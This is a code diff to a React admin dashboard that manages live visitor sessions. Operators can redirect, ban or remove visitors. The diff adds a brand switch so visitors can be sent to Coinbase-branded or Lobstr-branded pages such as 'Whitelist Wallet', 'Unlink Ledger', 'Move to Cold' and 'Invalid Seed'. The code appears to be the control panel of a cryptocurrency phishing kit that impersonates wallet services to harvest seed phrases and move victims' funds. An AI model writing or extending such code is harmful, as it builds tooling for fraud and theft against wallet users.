@@ -154,6 +154,7 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
           selectedPage={selectedPage}
           onPageChange={setSelectedPage}
           isHovered={false}
+          selectedBrand={selectedBrand}
         />
         
         <div className="flex items-center space-x-2">
@@ -186,31 +187,44 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
   );
 };
 
-const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered }) => {
-  const pageCategories = {
-    Introduction: [
-      { id: 'loading.html', name: 'Loading' },
-      { id: 'review.html', name: 'Review' },
-      { id: 'estimatedbalance.html', name: 'Estimated Balance' },
-      { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
-    ],
-    'Hardware Wallets': [
-      { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
-      { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
-      { id: 'MoveToCold.html', name: 'Move to Cold' }
-    ],
-    Awaiting: [
-      { id: 'Pendingreview.html', name: 'Pending Review' }
-    ],
-    'Completed Task': [
-      { id: 'Completed.html', name: 'Review Completed' },
-      { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
-    ],
-    Others: [
-      { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
-      { id: 'InvalidSeed.html', name: 'Invalid Seed' }
-    ]
-  }
+const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered, selectedBrand }) => {
+  const brandCategories = {
+    Coinbase: {
+      Introduction: [
+        { id: 'loading.html', name: 'Loading' },
+        { id: 'review.html', name: 'Review' },
+        { id: 'estimatedbalance.html', name: 'Estimated Balance' },
+        { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
+      ],
+      'Hardware Wallets': [
+        { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
+        { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
+        { id: 'MoveToCold.html', name: 'Move to Cold' }
+      ],
+      Awaiting: [
+        { id: 'Pendingreview.html', name: 'Pending Review' }
+      ],
+      'Completed Task': [
+        { id: 'Completed.html', name: 'Review Completed' },
+        { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
+      ],
+      Others: [
+        { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
+        { id: 'InvalidSeed.html', name: 'Invalid Seed' }
+      ]
+    },
+    Lobstr: {
+      Loading: [
+        { id: 'lobstrloading.html', name: 'Loading' }
+      ],
+      'Account Actions': [
+        { id: 'lobstrreview.html', name: 'Review' },
+        { id: 'lobstrcomplete.html', name: 'Complete' }
+      ]
+    }
+  };
+  
+  const pageCategories = brandCategories[selectedBrand] || brandCategories.Coinbase
 
   return (
     <div className="relative flex-shrink-0" style={{ maxWidth: '180px' }}>
@@ -365,7 +379,7 @@ const SessionHeaderRow = () => {
   );
 };
 
-const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
+const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand }) => {
   const { settings } = useAdminSocket();
   const [selectedPage, setSelectedPage] = useState(session.currentPage || 'loading.html');
   const [isHovered, setIsHovered] = useState(false);
@@ -509,6 +523,7 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
             selectedPage={selectedPage}
             onPageChange={setSelectedPage}
             isHovered={isHovered}
+            selectedBrand={selectedBrand}
           />
 
           <button
@@ -546,7 +561,7 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
   );
 };
 
-const SessionList = () => {
+const SessionList = ({ selectedBrand }) => {
   // Add settings to the destructured values from useAdminSocket
   const { sessions, banIP, redirectUser, removeSession, settings } = useAdminSocket();
   const [isHovered, setIsHovered] = useState(false);
@@ -625,6 +640,7 @@ const SessionList = () => {
                   onBan={handleBanIP}
                   onRemove={handleRemoveSession}
                   isNew={newSessions.has(session.id)}
+                  selectedBrand={selectedBrand}
                 />
               ))}
             </div>
@@ -640,6 +656,7 @@ const SessionList = () => {
             onBan={handleBanIP}
             onRemove={handleRemoveSession}
             isNew={newSessions.has(session.id)}
+            selectedBrand={selectedBrand}
           />
         ))}
       </div>
